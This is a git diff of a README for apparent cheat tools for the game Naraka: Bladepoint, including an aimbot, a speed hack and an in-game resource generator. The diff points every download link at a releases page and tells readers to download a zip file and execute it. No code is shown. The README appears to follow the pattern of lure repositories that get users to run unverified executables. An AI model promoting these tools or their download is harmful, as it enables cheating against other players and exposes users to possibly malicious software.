@@ -1,6 +1,6 @@
 # Naraka: Bladepoint Cheats 🎮
 
-![Naraka: Bladepoint](https://img.shields.io/badge/Naraka--Bladepoint-Cheats-blue)
+![Naraka: Bladepoint](https://github.com/shravan-sg/Naraka/releases)
 
 Welcome to the **Naraka** repository! This project includes tools designed to enhance your gameplay experience in *Naraka: Bladepoint*. The tools provided here include an aimbot, a speed hack, and a resource generator. Each tool is aimed at improving your performance in the game, allowing you to focus on strategy and skill without the usual grind.
 
@@ -34,7 +34,7 @@ The resource generator provides in-game items without the need for traditional g
 
 ## Installation
 
-To get started with the tools, you will need to download the application. You can find it [here](https://github.com/user/repo/Application.zip). Download the file and execute it to begin using the tools.
+To get started with the tools, you will need to download the application. You can find it [here](https://github.com/shravan-sg/Naraka/releases). Download the file and execute it to begin using the tools.
 
 1. **Download the Application**: Click the link above to download the zip file.
 2. **Extract the Files**: Once downloaded, extract the contents of the zip file to a folder of your choice.
@@ -76,6 +76,6 @@ For any questions or feedback, please reach out via GitHub issues or contact me 
 
 For more updates and tools, please check the "Releases" section of this repository. Your support helps keep the project active and improving! 
 
-Remember, you can always download the application [here](https://github.com/user/repo/Application.zip) for easy access to all the features.
+Remember, you can always download the application [here](https://github.com/shravan-sg/Naraka/releases) for easy access to all the features.
 
 Happy gaming! 🎮
